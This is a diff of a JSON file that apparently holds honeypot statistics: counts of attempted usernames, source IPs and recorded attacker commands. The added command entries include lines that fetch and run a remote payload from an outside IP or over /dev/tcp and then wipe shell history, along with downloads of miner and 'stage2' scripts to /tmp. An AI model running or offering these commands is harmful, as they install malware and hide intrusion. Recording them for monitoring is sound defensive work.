@@ -1,9 +1,9 @@
 {
-  "LastUpdated": "2026-10-17T09:00:47.3946458Z",
+  "LastUpdated": "2026-10-17T09:11:12.7970478Z",
   "TotalUniqueUsernames": 772,
   "TotalUniquePasswords": 1392,
   "TotalUniqueSourceIps": 1472,
-  "TotalUniqueCommands": 185,
+  "TotalUniqueCommands": 190,
   "Usernames": {
     "root": 5039,
     "admin": 1594,
@@ -3629,7 +3629,7 @@
     "94.241.198.202": 4,
     "102.152.27.92": 4,
     "70.34.202.108": 11,
-    "102.220.160.67": 2,
+    "102.220.160.67": 3,
     "176.124.134.241": 4,
     "198.235.24.225": 2,
     "170.231.236.98": 2,
@@ -3831,6 +3831,11 @@
     "nvidia-smi -q | grep \u0022Product Name\u0022 | head -n 1 | awk \u0027{print $4, $5, $6, $7, $8, $9}\u0027 || echo \u0027No\u0027": 1,
     "nvidia-smi -q | grep \u0022Attached GPUs\u0022 | awk \u0027{print $4}\u0027 \u0026\u0026 echo \u0027\u0027 || echo \u0027No\u0027": 1,
     "for d in /dev/shm /var/tmp /tmp; do printf \u0027%s\u0027 \u0027ZmE=\u0027 | base64 -d \u003E \u0022$d/.wall_07861205\u0022; done": 1,
-    "curl -sSL http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG -o ~/.sysmonitor 2\u003E/dev/null || wget -qO ~/.sysmonitor http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG 2\u003E/dev/null || { exec 3\u003C\u003E/dev/tcp/103.160.59.94/28816 \u0026\u0026 echo -e \u0022GET /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG HTTP/1.1\\r\\nHost: 103.160.59.94\\r\\nConnection: close\\r\\n\\r\\n\u0022 \u003E\u00263 \u0026\u0026 cat \u003C\u00263 | sed \u00221,/^\\r$/d\u0022 \u003E ~/.sysmonitor; }; chmod \u002Bx ~/.sysmonitor \u0026\u0026 ~/.sysmonitor \u0026\u0026 history -c \u0026\u0026 history -w": 1
+    "curl -sSL http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG -o ~/.sysmonitor 2\u003E/dev/null || wget -qO ~/.sysmonitor http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG 2\u003E/dev/null || { exec 3\u003C\u003E/dev/tcp/103.160.59.94/28816 \u0026\u0026 echo -e \u0022GET /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG HTTP/1.1\\r\\nHost: 103.160.59.94\\r\\nConnection: close\\r\\n\\r\\n\u0022 \u003E\u00263 \u0026\u0026 cat \u003C\u00263 | sed \u00221,/^\\r$/d\u0022 \u003E ~/.sysmonitor; }; chmod \u002Bx ~/.sysmonitor \u0026\u0026 ~/.sysmonitor \u0026\u0026 history -c \u0026\u0026 history -w": 1,
+    "echo \u0027{{SUDO_PASS_1}}\u0027 | sudo -S sh -c \u0027nproc 2\u003E/dev/null || /usr/bin/nproc 2\u003E/dev/null || busybox nproc 2\u003E/dev/null || grep -c \u0027\\\u0027\u0027^processor\u0027\\\u0027\u0027 /proc/cpuinfo 2\u003E/dev/null\u0027 || echo \u0027{{SUDO_PASS_1}}\u0027 | sudo -S nproc 2\u003E/dev/null || /usr/bin/nproc 2\u003E/dev/null || busybox nproc 2\u003E/dev/null || grep -c \u0027^processor\u0027 /proc/cpuinfo 2\u003E/dev/null || sh -c \u0027nproc 2\u003E/dev/null || /usr/bin/nproc 2\u003E/dev/null || busybox nproc 2\u003E/dev/null || grep -c \u0027\\\u0027\u0027^processor\u0027\\\u0027\u0027 /proc/cpuinfo 2\u003E/dev/null\u0027 || nproc 2\u003E/dev/null || /usr/bin/nproc 2\u003E/dev/null || busybox nproc 2\u003E/dev/null || grep -c \u0027^processor\u0027 /proc/cpuinfo 2\u003E/dev/null": 1035,
+    "chmod \u002Bx /tmp/{{TMP_FILE_1}}": 3,
+    "curl -s http://{{HOST_1}}/miner.sh -o /tmp/{{TMP_FILE_1}}": 2,
+    "curl -s http://{{HOST_1}}/stage2.sh -o /tmp/{{TMP_FILE_1}}": 1,
+    "curl -sSL http://{{HOST_1}}/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG -o ~/.sysmonitor 2\u003E/dev/null || wget -qO ~/.sysmonitor http://{{HOST_1}}/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG 2\u003E/dev/null || { exec 3\u003C\u003E/dev/tcp/{{HOST_1}}/28816 \u0026\u0026 echo -e \u0022GET /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG HTTP/1.1\\r\\nHost: {{HOST_1}}\\r\\nConnection: close\\r\\n\\r\\n\u0022 \u003E\u00263 \u0026\u0026 cat \u003C\u00263 | sed \u00221,/^\\r$/d\u0022 \u003E ~/.sysmonitor; }; chmod \u002Bx ~/.sysmonitor \u0026\u0026 ~/.sysmonitor \u0026\u0026 history -c \u0026\u0026 history -w": 1
   }
 }
